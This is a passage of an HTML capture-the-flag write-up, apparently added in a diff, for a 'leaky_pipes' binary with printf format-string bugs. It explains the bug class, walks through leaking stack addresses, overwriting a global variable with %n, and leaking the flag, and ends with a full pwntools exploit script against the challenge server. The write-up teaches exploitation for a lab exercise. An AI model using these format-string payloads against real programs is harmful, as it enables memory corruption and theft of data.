+switch(choice){
+  case '1':
+    check_leaks();
+    break;
+  case '2':
+    call_plumber();
+    break;
+  case '3':
+    buy_repair_kit();
+    break;
+  default:
+    printf("Invalid choice: \n");
+    break;
+}
+}
+return 0;
+
+}</code></pre>
+<p>Firstly, let us look into what main() is doing!</p>
+<ul>
+<li>The main() function takes a character input&nbsp;<code>choice</code>. Depending on our input the functions&nbsp;<code>check_leaks()</code>,&nbsp;<code>call_plumber</code>&nbsp;and&nbsp;<code>buy_repair_kit()</code>&nbsp;are called respecitively. Another thing to note is, it runs in an infinite while loop; meaning we can call each of these functions as many times as possible.</li>
+</ul>
+<p>Now let's analyze what happens when each of the functions are called as we give our input choice.</p>
+<h5 class="atx" id="check_leaks">check_leaks():</h5>
+<p>Input choice&nbsp;<code>1</code>&nbsp;in the main() function, calls for check_leaks(). What happens here and are there any vulnerabilities in this function? If so how can we exploit it? To answer the above questions, let's look at the&nbsp;<code>check_leaks()</code>&nbsp;function in the given source code. As we can see, from the above source code, cheak_leaks() prints out the balance in your account and asks you where you would like to check your leaks. Thereafter, fgets reads 100 bytes of user input into&nbsp;<code>leak</code>&nbsp;and simply prints out your leaks using&nbsp;<code>printf(leak)</code>. Now why is this a vulnerability? To understand that, let's dive into the concept of&nbsp;<strong>format strings</strong>!</p>
+<h6 class="atx" id="format-strings-">Format Strings :</h6>
+<p><strong>What are format strings?</strong></p>
+<p>If we look at the manual page of&nbsp;<code>printf()</code>&nbsp;function in C, a format strings is defined as:</p>
+<p>"The format string is a character string, beginning and ending in its initial shift state, if any. The format string is composed of zero or more directives: ordinary characters (not %), which are copied unchanged to the output stream; and conversion specifications, each of which results in fetching zero or more subsequent arguments. Each conversion specification is introduced by the character %, and ends with a conversion specifier."</p>
+<p><strong>So what does it mean?</strong></p>
+<p>Let's consider an example!</p>
+<p>A more familiar widely used syntax while calling printf() looks something like this:</p>
+<pre><code class="fenced-code-block language-c=">char my_string[15] = "hello_world!"; 
+printf("%s", my_string);</code></pre>
+<p>As we can see, the first parameter to printf() is a "%s" character implying that a character string should be printed out to screen as output. The second parameter is the the location or simply the variable where the string&nbsp;<code>hello_world!</code>&nbsp;is stored in memory.</p>
+<p>Here, "%s" is called as the format specifier as it determines what kind of conversion should be done on the subsequent arguments to produce a suitable output. (In this case, our suitable output is a character string.) What are the other format specifiers?</p>
+<p>Some other very commonly used format specifiers are:</p>
+<pre><code class="fenced-code-block">printf("%c", my_char);    --&gt; to print a single character to the screen
+printf("%d", my_number);  --&gt; to print a number to the screen
+printf("%f", my_number);  --&gt; to print a float to the screen
+printf("%x", my_number);  --&gt; %x indicates that the int value should be displayed in hexadecimal. 
+printf("%p", &amp;my_number); --&gt; %p is used for printing the value of a pointer. Therefore the second argument to the printf() is always an address. 
+printf("%n", &amp;my_number); --&gt; %n prints nothing, instead stores the number of characters printed to the screen to the variable `my_number`.</code></pre>
+<p>Similary :</p>
+<pre><code class="fenced-code-block">"%lu" is used for "unsigned long"
+"%i" is used for "unsigned integer"
+"%o" is used for "octal" and so forth! </code></pre>
+<p><strong>Vulnerabilities?</strong></p>
+<p>Often in exploitation analysis, we have noticed that not all C-library functions are bug free and despite the protections and compiler warnings, it is always possible to overwrite some memory junk, and cause malicious behavior of the program.</p>
+<p><code>printf()</code>&nbsp;too has vulnerabilities, that allow us to overwrite addresses and cause such malicious behavior. One example would be to make use of printf() to overwrite a certain&nbsp;<code>got_address</code>&nbsp;with&nbsp;<code>system()</code>&nbsp;address.</p>
+<p>As we know, printf() follows a default syntax where it accepts at least 2 parameters, (first one being a format specifier and the second being the location or a pointer). However it is seen that,&nbsp;<code>printf(my_string)</code>&nbsp;where&nbsp;<code>my_string</code>&nbsp;is a character array containing the string "hello_world!", will result in "hello_world!" being printed out to the screen. One may ask, despite the usual behavior, how is this a vulnerability. To understand more, let's consider a case where the argument to printf() is user controlled.</p>
+<p>Example:</p>
+<pre><code class="fenced-code-block language-c=">char inpBuf[20];             
+fgets(inpBuf, 20, stdin);  
+printf(inpBuf);                 </code></pre>
+<p>So what do we understand from the above three lines of code?</p>
+<p>We see that, the user inputs data into&nbsp;<code>inpBuf</code>&nbsp;and the same character array is passed as an argument to printf() without any format specifiers. Now suppose the user decides to give "%p" or a "%x" as his user buffer in the input stream, what do you think will be printed to the screen? Since the first argument given is a format specifier, the pointer value or the address of whatever is present on the top of the stack will be printed out. In case of a 64-bit system, since if the user decides to give "%p" as his inpBuf, it will print the pointer value in register "rsi" since the second argument will be stored "rsi" after the first argument ("%p") being stored in "rdi". Therefore, a user may decide to leak data from the stack by giving suitable offsets i.e "%4$p" will print the pointer value of the 4th offset on the stack. And this is how printf() is abused.</p>
+<p><strong>We will thus make use of the above vulnerability to obtain leaks from memory and also write to memory in a similar manner. This will be discussed in the exploitation part of this writeup.</strong></p>
+<h5 class="atx" id="call_plumber">call_plumber():</h5>
+<p>Input choice&nbsp;<code>2</code>&nbsp;in the main() function, calls for call_plumber(). This function however may not be of much significance to us as it simply prints "Why must you call the plumber when you can fix the leak yourself?". Moving on!</p>
+<h5 class="atx" id="buy_repair_kit">buy_repair_kit():</h5>
+<p>Input choice&nbsp;<code>3</code>&nbsp;in the main() function, calls for&nbsp;<code>buy_repair_kit()</code>. This function is quite interesting as firstly it checks if&nbsp;<code>bal == 200</code>. If the condition is satisfied it will call&nbsp;<code>use_tapes</code>. Else it simply prints "You do not have enough balance! :(". If we look at the&nbsp;<strong>global variable</strong>&nbsp;<code>bal</code>, we can see that it is initialized to&nbsp;<code>100</code>, whereas&nbsp;<code>bal == 200</code>&nbsp;in order to pass the check. Which means we need to find a way to overwrite&nbsp;<code>bal</code>&nbsp;variable with&nbsp;<code>200</code>&nbsp;so that use_tapes() will be called. We will see more of this in the exploitation section of the writeup. For now let's continue with understanding the source code.</p>
+<h5 class="atx" id="use_tapes">use_tapes():</h5>
+<p>This function is only called by&nbsp;<code>buy_repair_kit</code>&nbsp;once the condition is satisfied. However we do find that use_tapes() asks for our experience and prints our experience using&nbsp;<code>printf(experience)</code>. Another thing to notice in this function is that the flag is read from&nbsp;<code>flag.txt</code>&nbsp;into the variable&nbsp;<code>flag</code>&nbsp;however it is not printed out. Luckily for us, we observe just another format string vulnerability here, i.e&nbsp;<code>printf(experience)</code>. Since we have understood how printf() can be used to leak data from memory, we will use the same concept here to leak the flag!</p>
+<h4 class="atx" id="exploitation">Exploitation:</h4>
+<p>Now that we have understood the binary and a few other concepts related to the challenge, our logic for exploitation is pretty simple:</p>
+<ul>
+<li>call the function&nbsp;<code>check_leaks</code>&nbsp;to obtain the address leak for the global variable&nbsp;<code>bal</code>&nbsp;with the help of the format string vullnerability.</li>
+<li>call the function&nbsp;<code>check_leaks</code>&nbsp;again to change the value in the global variable&nbsp;<code>bal</code>&nbsp;from 100 to 200.</li>
+<li>call the function&nbsp;<code>buy_repair_kit()</code>, pass the check so that the function&nbsp;<code>use_tapes()</code>&nbsp;is called.</li>
+<li>Once&nbsp;<code>use_tapes</code>&nbsp;is called, make use of the format string vulnerability to simply leak the flag!</li>
+</ul>
+<p>Let's begin the exploit by going through each of the above four steps.</p>
+<h5 class="atx" id="leaking-the-address-of-the-global-variable-andquotbalandquot">Leaking the address of the global variable "bal":</h5>
+<p>This might seem a bit tricky and confusing at first, but once we start to analyse and dig in deeper, it will become more and more clearer. We will be leaking the address of bal from the&nbsp;<code>check_leaks()</code>&nbsp;function. Thus let us assume our payload to be something of this sort:</p>
+<p><code>payload = 'aaaaaaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'</code></p>
+<p>With this payload, our output is:</p>
+<pre><code class="fenced-code-block">aaaaaaaa 0x7fb885c53a03 (nil) 0x7fb885b79142 0x7ffcd0ad0140 (nil) 0x6161616161616161 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fb885c5000a 0x7fb885aed546 0x55efa9bb0560 0xe65c75d40c88e400 0x7ffcd0ad01d0 0x55efa9bb0532 0x31007ffcd0ad02c0 0xe65c75d40c88e400 (nil)</code></pre>
+<p>Upon noticing closely, the value at the 6th offset i.e&nbsp;<code>0x6161616161616161</code>&nbsp;is nothing but our input string&nbsp;<code>aaaaaaaa</code>. We find many other addresses such libc or code addresses. We are however interested in the the address leaked at the 18th offset i.e&nbsp;<code>0x55efa9bb0560</code>. Why this address? Well first off wherever our global variable&nbsp;<code>bal</code>&nbsp;is stored in memory, its offset from the&nbsp;<code>code_base</code>&nbsp;address won't change! Not just the&nbsp;<code>code_base</code>, but from any given code address, the offset always remains constant! The address of the global variable&nbsp;<code>bal</code>&nbsp;can be found using the command&nbsp;<code>i var bal</code>&nbsp;in gdb (Or one can simply use ida/ ghidra for finding the address). As we can see:</p>
+<pre><code class="fenced-code-block">gdb-peda$ i var bal
+All variables matching regular expression "bal":
+
+File global-locale.c:
+39: struct __locale_struct _nl_global_locale;
+
+File malloc.c:
+1611: static size_t global_max_fast;
+
+File resolv_conf.c:
+80: static struct resolv_conf_global *global;
+
+File rtld.c:
+278:  struct rtld_global _rtld_global;
+306:  struct rtld_global_ro _rtld_global_ro;
+
+Non-debugging symbols:
+0x000055efa9bb2d68  __do_global_dtors_aux_fini_array_entry
+0x000055efa9bb3010  bal
+gdb-peda$ </code></pre>
+<p>The address of the global variable&nbsp;<code>bal</code>&nbsp;is&nbsp;<code>0x000055efa9bb3010</code>. Since the offset of the global variable remains constant from code_base or any code address for that matter, we can make use of the leak obtained at the 18th offset above, ie&nbsp;<code>0x55efa9bb0560</code>, to find the address of&nbsp;<code>bal</code>. How? Find the offset of the variable&nbsp;<code>bal</code>&nbsp;from the leaked stack address, add the offset to the leaked stack address. You may also see how it's actually calculated!</p>
+<pre><code class="fenced-code-block">gdb-peda$ p 0x000055efa9bb3010 - 0x55efa9bb0560
+$1 = 0x2ab0
+gdb-peda$ x/x 0x55efa9bb0560 + 0x2ab0
+0x55efa9bb3010 &lt;bal&gt;: 0x00000000000000c8
+gdb-peda$ </code></pre>
+<p>As we can see, the global variable&nbsp;<code>bal</code>&nbsp;is present at an offset of 0x2ab0 above the obtained stack leak address.</p>
+<p>And so we have have obtained the address for the variable&nbsp;<code>bal</code>&nbsp;i.e&nbsp;<code>0x55efa9bb0560 + 0x2ab0 = 0x000055efa9bb3010</code></p>
+<h3 class="atx" id="overwriting-the-value-of-bal-from-100-to-200">Overwriting the value of&nbsp;<code>bal</code>&nbsp;from 100 to 200:</h3>
+<p>Now that we have obtained the address for the global variable&nbsp;<code>bal</code>, our task is to overwrite it with&nbsp;<code>200</code>. Since there are no other vulnerabilities in the program, we will have to look for a way to overwrite&nbsp;<code>bal</code>&nbsp;using format strings only. Thus we will call the function&nbsp;<code>call_leaks()</code>&nbsp;again, this time to write to memory. This can be done in 2 ways:</p>
+<ul>
+<li>Using&nbsp;<code>fmtstr_payload(offset, {addr : value})</code>&nbsp;in pwntools.<ul>
+<li>While we make use of the above built in function in pwntools, we must note that the offset we give is equal to 6, as we saw above, our input string was found at offset 6. The address we give here is the address of the global variable bal, and the value to give is 200 since that is what we are going to overwrite it with. Thus our payload is something like:&nbsp;<code>payload = fmtstr_payload(6, {bal_address : 200})</code></li>
+</ul>
+</li>
+<li>Using&nbsp;<code>%n</code>&nbsp;format specifier.<ul>
+<li>This could be a bit tricky as it requires for us to understand the concept.&nbsp;<code>%n</code>&nbsp;prints nothing, instead stores the number of characters printed onto the screen to the given variable. So what does this mean? Let's consider an example:</li>
+</ul>
+</li>
+</ul>
+<pre><code class="fenced-code-block language-c=">#include&lt;stdio.h&gt;
+int main() {
+   int s;
+   printf("The value of %ns : ", &amp;s);
+   printf("%d", s);
+   getchar();
+   return 0;
+}</code></pre>
+<p>Output obtained is:&nbsp;<code>The value of s : 13</code>. Why? That's because the number of characters printed before&nbsp;<code>%n</code>&nbsp;is 13. We shall use a similar concept to write to memory.</p>
+<p>While writing to memory, we must keep a few things in mind, the offset, the address and the value to overwrite it with. Our offset being 6, adress being that of the recently obtained global variable bal and the value to overwrite it being 200. Our payload will look something like this:</p>
+<pre><code class="fenced-code-block language-python=">pay = '%{}p'.format(200-7)  # print (200 - 7) characters to the screen. 
+pay += 'c'*7      # print 7 characters to the screen. 
+pay += '%8$n'     # Find the offset where address of bal is written to memory. 
+pay += p64(bal)   # Write the address of bal to memory.</code></pre>
+<p>Here is how it looks like in memory!<img alt="memory" src="https://i.imgur.com/Rkf58fb.png"></p>
+<p>Thus we see that the address of bal is present at the 8th offset. Another way to calculate would be:&nbsp;<code>(0x7ffcd0ad0150 - 0x7ffcd0ad0140)//8 + 6</code>, where&nbsp;<code>0x7ffcd0ad0150</code>&nbsp;is where address of bal is written,&nbsp;<code>0x7ffcd0ad0140</code>&nbsp;is where our input string is stored, all on the stack. Once we overwrite we can check the value now stored in&nbsp;<code>bal</code>&nbsp;to verify.</p>
+<pre><code class="fenced-code-block">gdb-peda$ x/x 0x55efa9bb3010
+0x55efa9bb3010 &lt;bal&gt;: 0x00000000000000c8</code></pre>
+<h5 class="atx" id="obtain-the-flag">Obtain the flag:</h5>
+<p>Now that we have leaked and written to memory, once the check passes,&nbsp;<code>use_tapes</code>&nbsp;will be called where our next task is to simply leak the flag. Similar to as shown above we can either use '%s' or a '%p' format specifier to leak the flag string. If we are making use of '%p' to leak, we need to be use of converting from hex to string! To find the offset let's give a string of '%p' and see where the flag could be on the stack!&nbsp;<code>payload = '%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'</code>. Output:</p>
+<pre><code class="fenced-code-block">0x7fb885c53a03 (nil) 0x7fb885b79142 0x7ffcd0ad0120 (nil) (nil) 0x55efaad082a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x25 0x7fb885afc013 0x667b6a6674636e69 </code></pre>
+<p>Thus we can find our input string at the 8th offset or if we look closely, we can find that value leaked at the 16th offset is nothing but our flag! Thus to just leak the flag, our payload can be,&nbsp;<code>payload = %16$p %17$p %18$p %19$p %20$p %21$p</code>, while running on the server.</p>
+<h4 class="atx" id="exploit">Exploit:</h4>
+<pre><code class="fenced-code-block language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'x86_64'</span>
+<span class="token comment">#p = process('./leaky_pipes')</span>
+
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'gc1.eng.run'</span><span class="token punctuation">,</span> <span class="token number">31584</span><span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(p)</span>
+
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+pay <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token string">' %18$p'</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaaaaaa '</span><span class="token punctuation">)</span>
+leak <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+
+bal <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leak<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x2ab0</span>
+info<span class="token punctuation">(</span><span class="token string">"bal: %s"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bal<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+
+pay <span class="token operator">=</span> <span class="token string">'%{}p'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment"># print (200 - 7) characters to the screen. </span>
+pay <span class="token operator">+=</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">7</span>      <span class="token comment"># print 7 characters to the screen. </span>
+pay <span class="token operator">+=</span> <span class="token string">'%8$n'</span>     <span class="token comment"># Find the offset where address of bal is written to memory. </span>
+pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bal<span class="token punctuation">)</span>   <span class="token comment"># Write the address of bal to memory.</span>
+pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%16$p %17$p %18$p %19$p %20$p %21$p'</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give us your feedback!\n"</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+  flag <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+info<span class="token punctuation">(</span><span class="token string">"flag: %s"</span><span class="token operator">%</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+</article>
+</body>
+</html>
